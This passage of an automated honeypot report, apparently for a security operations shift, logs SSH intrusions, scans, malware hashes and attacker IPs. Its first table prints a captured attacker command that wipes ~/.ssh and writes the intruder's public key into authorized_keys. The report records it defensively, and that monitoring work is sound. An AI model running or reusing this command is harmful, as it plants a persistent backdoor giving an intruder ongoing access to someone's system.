| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:24:01` | `cowrie.session.connect` |
| `2026-05-05 17:24:01` | `cowrie.client.version` |
| `2026-05-05 17:24:01` | `cowrie.client.kex` |
| `2026-05-05 17:24:01` | `cowrie.login.success` |
| `2026-05-05 17:24:01` | `cowrie.session.params` |
| `2026-05-05 17:24:01` | `cowrie.command.input` |
| `2026-05-05 17:24:01` | `cowrie.command.failed` |
| `2026-05-05 17:24:01` | `cowrie.log.closed` |
| `2026-05-05 17:24:01` | `cowrie.session.params` |
| `2026-05-05 17:24:01` | `cowrie.command.input` |
| `2026-05-05 17:24:01` | `cowrie.session.file_download` |
| `2026-05-05 17:24:01` | `cowrie.log.closed` |
| `2026-05-05 17:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d3d152ff46

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-05-05 17:24 |
| **Last Seen** | 2026-05-05 17:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:24:02` | `cowrie.session.connect` |
| `2026-05-05 17:24:02` | `cowrie.client.version` |
| `2026-05-05 17:24:02` | `cowrie.client.kex` |
| `2026-05-05 17:24:02` | `cowrie.login.success` |
| `2026-05-05 17:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `64.31.63[.]113` | **164** | 2026-05-05 11:56 | 2026-05-05 14:36 | 96m | 0 | `T1592` | 🟠 MEDIUM |
| `121.229.25[.]10` | **31** | 2026-05-05 16:39 | 2026-05-05 17:04 | 55m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.92.140[.]209` | **30** | 2026-05-05 15:10 | 2026-05-05 15:52 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.196.165[.]49` | **30** | 2026-05-05 12:38 | 2026-05-05 13:14 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `92.205.57[.]72` | **30** | 2026-05-05 16:37 | 2026-05-05 17:10 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.81.244[.]142` | **27** | 2026-05-05 16:49 | 2026-05-05 17:27 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.134.199[.]27` | **25** | 2026-05-05 14:50 | 2026-05-05 14:55 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `180.252.199[.]166` | **9** | 2026-05-05 10:06 | 2026-05-05 10:42 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `223.123.43[.]68` | **8** | 2026-05-05 14:07 | 2026-05-05 14:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `106.75.2[.]237` | **5** | 2026-05-05 16:18 | 2026-05-05 16:18 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `115.190.113[.]93` | **5** | 2026-05-05 10:43 | 2026-05-05 11:04 | 6m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `176.251.64[.]35` | **4** | 2026-05-05 16:06 | 2026-05-05 16:21 | 8m | 0 | `T1592` | 🟢 LOW |
| `139.180.213[.]221` | **3** | 2026-05-05 10:27 | 2026-05-05 12:59 | 2m | 0 | `T1592` | 🟢 LOW |
| `18.223.2[.]197` | **3** | 2026-05-05 15:24 | 2026-05-05 15:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `188.165.32[.]102` | **2** | 2026-05-05 12:31 | 2026-05-05 12:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.221.60[.]108` | **2** | 2026-05-05 15:23 | 2026-05-05 15:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.78.231[.]111` | **2** | 2026-05-05 17:06 | 2026-05-05 17:06 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `72.167.34[.]216` | **2** | 2026-05-05 11:06 | 2026-05-05 11:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.47.8[.]188` | 1 | 2026-05-05 12:45 | 2026-05-05 12:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.33.113[.]91` | 1 | 2026-05-05 12:35 | 2026-05-05 12:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.111[.]71` | 1 | 2026-05-05 10:50 | 2026-05-05 10:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]93` | 1 | 2026-05-05 16:50 | 2026-05-05 16:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.31.140[.]121` | 1 | 2026-05-05 10:07 | 2026-05-05 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `157.245.243[.]118` | 1 | 2026-05-05 16:22 | 2026-05-05 16:22 | 2s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-05-05 10:10 | 2026-05-05 10:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-05-05 10:42 | 2026-05-05 10:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-05-05 14:56 | 2026-05-05 14:58 | 120s | 1 | `T1110.001` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-05-05 16:39 | 2026-05-05 16:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.92.182[.]129` | 1 | 2026-05-05 17:14 | 2026-05-05 17:14 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.103.29[.]15` | 1 | 2026-05-05 16:44 | 2026-05-05 16:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `20.115.99[.]68` | 1 | 2026-05-05 14:38 | 2026-05-05 14:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `209.89.227[.]9` | 1 | 2026-05-05 11:15 | 2026-05-05 11:15 | 3s | 0 | `T1592` | 🟢 LOW |
| `24.163.114[.]60` | 1 | 2026-05-05 11:59 | 2026-05-05 11:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.174.174[.]10` | 1 | 2026-05-05 14:54 | 2026-05-05 14:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `54.163.45[.]247` | 1 | 2026-05-05 12:55 | 2026-05-05 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.176.235[.]235` | 1 | 2026-05-05 14:29 | 2026-05-05 14:29 | 5s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.103.29[.]15` | VE | CORPORACION FIBEX TELECOM, C.A. | **100** ⚠️ | 1 |
| `157.245.243[.]118` | US | DigitalOcean, LLC | **100** ⚠️ | 23 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `64.31.63[.]113` | FR | Limestone Networks, Inc. | **100** ⚠️ | 2 |
| `34.78.231[.]111` | BE | Google LLC | **100** ⚠️ | 0 |
| `180.252.199[.]166` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 3 |
| `54.163.45[.]247` | US | Amazon Technologies Inc. | **100** ⚠️ | 34 |
| `121.229.25[.]10` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `92.205.57[.]72` | FR | Host Europe GmbH | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 268 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 135 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 94 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 48 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 47 |

---

## 🔕 False Positive Summary (73 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 18 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 40 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 567 cases |
| Tool 34  | Credential Extractor        | ✅ 230 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 82 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 73 filtered (12.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 94 priority case(s) shown individually · 36 recon entry/entries in table (18 group(s) consolidating 382 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-05T17:28:47Z_
